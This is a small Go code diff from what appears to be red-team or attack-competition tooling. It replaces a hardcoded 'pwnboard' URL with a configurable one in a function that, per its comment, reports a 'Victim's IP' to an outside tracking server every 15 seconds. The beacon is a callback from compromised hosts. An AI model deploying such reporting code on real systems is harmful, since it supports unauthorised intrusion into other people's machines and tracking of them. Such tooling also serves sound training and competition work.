@@ -329,7 +329,7 @@ func main() {
 // Request is done every 15 seconds
 // ip: Victim's IP
 func updatepwnBoard(ip string) {
-	url := "http://pwnboard.win/generic"
+	url := util.PwnboardURL
 
 	data := PwnBoard{
 		IPs:  ip,
